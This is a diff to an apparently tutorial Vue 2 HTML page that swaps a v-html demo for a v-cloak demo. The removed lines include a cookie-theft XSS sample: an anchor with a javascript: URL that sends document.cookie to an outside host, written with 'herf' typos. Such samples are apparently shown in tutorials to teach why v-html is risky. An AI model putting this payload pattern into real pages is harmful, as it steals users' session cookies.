@@ -4,15 +4,17 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>v-html指令</title>
-    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
+    <title>v-clock指令</title>
+    <!-- <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script> -->
+    <style>
+      [v-cloak] {
+        display: none;
+      }
+    </style>
   </head>
   <body>
     <div id="root">
-      <div>{{name}}</div>
-      <div v-text="name"></div>
-      <div v-html="str"></div>
-      <div v-html="str2"></div>
+      <h2 v-cloak>{{name}}</h2>
     </div>
   </body>
   <script type="text/javascript">
@@ -21,8 +23,6 @@
       data() {
         return {
           name: 'Mona',
-          str: '<h3> 你好呀 <h3>',
-          str2: '<a herf=javascript:location.herf="http://www.baidu.com?"+document.cookie>点击这里</a>',
         };
       },
     });
